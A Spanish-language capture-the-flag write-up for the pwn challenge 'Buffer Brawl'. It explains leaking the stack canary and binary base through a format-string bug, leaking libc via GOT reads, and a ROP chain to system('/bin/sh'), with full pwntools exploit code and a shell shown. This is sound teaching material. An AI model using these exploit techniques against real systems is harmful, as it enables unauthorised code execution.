# PWN / Buffer Brawl

Nos dan un juego en donde nos enfrentamos al stack y tenemos varias opciones:
```
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
```

Revisamos la seguridad del binario con checksec:
``` bash
checksec --file=buffer_brawl 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

No tiene nada relevante, pero sí encontramos una [vulnerabilidad de cadena formateada](https://owasp.org/www-community/attacks/Format_string_attack) en la funcion slip:
``` 
Ladies and gentlemen...
Are you ready? For the main event of the CTF?
Introducing...
A challenge that packs a punch, tests your mettle, and overflows with excitement!
Let's get ready to buffeeeeeeeer!!!


Choose:
1. Throw a jab
2. Throw a hook
3. Throw an uppercut
4. Slip
5. Call off
> 4

Try to slip...
Right or left?
%p
0x7ffca7cad6f0
```

El parámetro %p en una cadena de formato se utiliza para imprimir una dirección de memoria en formato hexadecimal, con varias podemos imprimir las direcciones de memoria en la pila.

Con este script filtramos las primeras 12 direcciones de memoria del stack y formateamos un poco la salida:

``` python
#leakstack.py
from pwn import *

elf = context.binary = ELF('./buffer_brawl')

io = process('./buffer_brawl')
io.sendline(b"4")
io.recvuntil(b"Right or left?\n")
io.sendline(b"%p"*14)
stack = io.recvline(keepends=False)
stack = [ 
         int(s,16) for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
         ]
print(stack)

for i, s in enumerate(stack):
    # i+1 because $ offsets start at 1
    print(f"{i+1}: {p64(s)} {hex(s)}") 
```

```
python3 leakstack.py 
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process './buffer_brawl': pid 6996
[140732999497680, 29, 140658260300893, 0, 0, 8080988412483825701, 8080988412483825701, 8080988412483825701, 94602831163429, 94888781943153, 7242369383397573120, 94888781944032, 94888781940551, 36]
1: b'\xd0wq\xf4\xfe\x7f\x00\x00' 0x7ffef47177d0
2: b'\x1d\x00\x00\x00\x00\x00\x00\x00' 0x1d
3: b']\xd4\xa3\x8d\xed\x7f\x00\x00' 0x7fed8da3d45d
4: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
5: b'\x00\x00\x00\x00\x00\x00\x00\x00' 0x0
6: b'%p%p%p%p' 0x7025702570257025
7: b'%p%p%p%p' 0x7025702570257025
8: b'%p%p%p%p' 0x7025702570257025
9: b'%p%p\nV\x00\x00' 0x560a70257025
10: b'q\x11$\x04MV\x00\x00' 0x564d04241171
11: b'\x00\xc2\x93\x1d\x95\x10\x82d' 0x648210951d93c200
12: b'\xe0\x14$\x04MV\x00\x00' 0x564d042414e0
13: b'G\x07$\x04MV\x00\x00' 0x564d04240747
14: b'$\x00\x00\x00\x00\x00\x00\x00' 0x24
[*] Stopped process './buffer_brawl' (pid 6996)
```

Escribimos el stack en 6, 11 es el canario y 13 es la direccion de retorno al menú. Podemos comprobar esto en radare2 u otro debbugger:

![f1](https://github.com/user-attachments/assets/21c62cc0-ed0b-4073-8b97-935f0c10b5c0)

![return](https://github.com/user-attachments/assets/ef5625c9-3247-4e99-95db-0c8c4d64da63)

La primera imagen es el estado de la pila justo después de introducir la cadena, y la segunda es justo antes de ret. Como podemos observar efectivamente la décimo-tercera dirección filtrada es el retorno.

Para calcular la direccion base del ejecutable solo hay que restarle el desplazamiento de esa direccion a la direccion filtrada. Encontramos el desplazamiento en un análisis estático al elf.

![slipreturn](https://github.com/user-attachments/assets/385fe987-62a0-4462-8ffd-8362b0318bfa)

%\<n\>$p es un identificador de formato que nos permite imprimir un valor específico de la pila, donde n es el desplazamiento a a dirección actual del puntero de pila, contado a partir de 1.

Entonces, podemos obtener las direcciones que nos interesan con %11$p y %13$p y calcular la direccion base del ejecutable, por ahora el script iría quedando así:

``` python3
from pwn import *
exe = context.binary = ELF("buffer_brawl")
io = process(exe.path)

def stack_leak(p):
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base
``` 

Aquí ahora necesitamos hacer un ret2libc, para eso necesitamos la dirección base de libc, pero primero tenemos que filtrar alguna dirección de las funciones de libc usadas en el ejecutable (printf, puts, etc...)

Nos auxiliaremos del parámetro %s, que muestra la memoria de una dirección dada en el stack (los símbolos de la Global Offset Table en tiempo de ejecución contienen la dirección real de la función en libc). El relleno con ljust se usa para alinear correctamente la memoria y asegurarse de que la dirección de la GOT esté en la posición adecuada:

``` python
# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak("puts")=:x}")

""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts
```

Bien, ahora necesitamos un buffer overflow para ganar una shell remota. Si dejamos la vida del stack en el juego a 13 exactamente nos lleva a una función stack_smash que acepta una entrada:

``` C
void stack_smash(void)

{
  long in_FS_OFFSET;
  undefined auStack_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nThe stack got dizzy! Now it\'s your time to win!");
  puts("Enter your move: ");
  __isoc99_scanf(&DAT_0010213d,auStack_28);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```

Haremos un ROP, para llamar a system('/bin/sh'), podemos encontrar los gadgets con ROPGadget:

```
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rax ; ret"

0x00000000000436a4 : add byte ptr [rax - 0x75], cl ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00000000000436a7 : add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x0000000000043047 : pop rax ; ret
0x00000000001027d1 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x00000000000cd4f2 : sub al, 0x3b ; sub al, 0x75 ; pop rax ; ret
0x00000000000cd4f5 : sub al, 0x75 ; pop rax ; ret

 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6| grep "pop rdi ; jmp rax"
0x000000000002d114 : pop rdi ; jmp rax
```

Script final:
``` python3 
from pwn import *
exe = context.binary = ELF("buffer_brawl")
libc = context.binary = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
# io = connect("buffer-brawl.chal.wwctf.com", 1337)
# io = connect("localhost",4444)
io = process(exe.path)

# 1.Obtener la direccion base del binario
def stack_leak(p):
    print(f"INPUT={p}")
    io.sendline(b"4")
    io.recvuntil(b"Right or left?\n")
    io.sendline(p)
    return io.recvline(keepends=False)

cookie, exe_leak = stack_leak(b"%11$p %13$p").split()
cookie = int(cookie[2:], 16)                              # Canario
exe_leak = int(exe_leak[2:], 16)                          # Direccion filtrada
exe.address = exe_leak - 0x1747                           # desplazamiento de la direccion de retorno a la base


# 2.Obtener la direccion base de libc
def leak_got(sym):
    addr = stack_leak(b"%7$s".ljust(8, b"_") + p64(exe.got[sym]))
    addr = u64(addr[:6] + b"\x00\x00")
    return addr

puts_addr = leak_got("puts")
io.info(f"{leak_got("puts")=:x}")
""""
# Usado para encontrar la version de libc correcta en el remoto
io.info(f"{leak_got("printf")=:x}")
io.info(f"{leak_got("read")=:x}")
io.info(f"{leak_got("exit")=:x}")
""" 

libc.address = puts_addr - libc.sym.puts

# 3.Lanzar golpes al stack hasta dejarlo en 13
for i in range(29):
    io.sendlineafter(b"\n> ", b"3")


# 4.ROP
payload = cyclic(24)
payload += p64(cookie)
payload += cyclic(8)
payload += p64(libc.address+0x0000000000043047)  # pop rax; ret
payload += p64(libc.sym.system)                  
payload += p64(libc.address+0x000000000002d114)  # pop rdi; jmp rax

payload += p64(next(libc.search(b"/bin/sh")))    # rdi

""" 
# Otra forma mas sencilla usando el objeto rop
rop = ROP([exe, libc])
rop.raw(rop.ret.address)                             # Alinear el stack
rop.call("system", [next(libc.search(b"/bin/sh"))])

payload = flat(
    cyclic(24),
    p64(cookie),
    cyclic(8),
    rop.chain(),
)
"""


io.sendline(payload)
io.success("PWNED")
io.interactive()
```

``` 
python3 exploit.py
[*] '/home/kalcast/Descargas/buffer_brawl'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
[+] Starting local process '/home/kalcast/Descargas/buffer_brawl': pid 17873
[*] leak_got("puts")=7fb48d5c8580
[+] PWNED
[*] Switching to interactive mode

You threw an uppercut! -3 to the stack's life points.

The stack got dizzy! Now it's your time to win!
Enter your move: 
$ whoami
kalcast
$  
```

